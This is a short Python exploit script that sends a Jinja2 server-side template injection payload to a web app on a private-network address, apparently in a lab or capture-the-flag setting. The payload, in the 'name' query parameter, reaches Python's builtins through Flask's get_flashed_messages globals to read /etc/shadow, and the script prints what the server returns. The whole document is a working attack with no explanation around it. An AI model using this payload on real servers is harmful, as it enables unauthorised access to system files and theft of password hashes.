import requests

x = requests.get("http://192.168.0.114/app?name={{get_flashed_messages.__globals__.__builtins__.open('/etc/shadow').read()}}")

print(x.text)